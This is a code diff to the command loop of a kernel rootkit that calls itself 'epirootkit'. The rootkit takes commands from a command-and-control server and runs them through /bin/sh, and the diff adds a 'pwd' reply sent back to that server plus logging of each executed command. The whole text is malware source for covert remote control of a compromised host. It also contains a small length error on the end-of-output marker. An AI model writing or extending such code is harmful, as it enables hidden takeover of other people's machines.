@@ -135,6 +135,12 @@ static int command_loop(void *data) {
             continue;
         }
 
+        if (strcmp(buffer, "pwd") == 0) {
+            send_to_c2(working_directory, strlen(working_directory));
+            send_to_c2("\n--EOF--\n", 8);
+            continue;
+        }
+
         if (strncmp(buffer, "cd", 2) == 0) {
             const char *path = buffer + 2;
             while (*path == ' ')
@@ -158,6 +164,7 @@ static int command_loop(void *data) {
         }
 
         snprintf(full_cmd, sizeof(full_cmd), "cd %s && %s > %s 2>&1", working_directory, buffer, tmp_output_path);
+        pr_info("epirootkit: executing: %s\n", full_cmd);
         argv[0] = "/bin/sh";
         argv[1] = "-c";
         argv[2] = full_cmd;
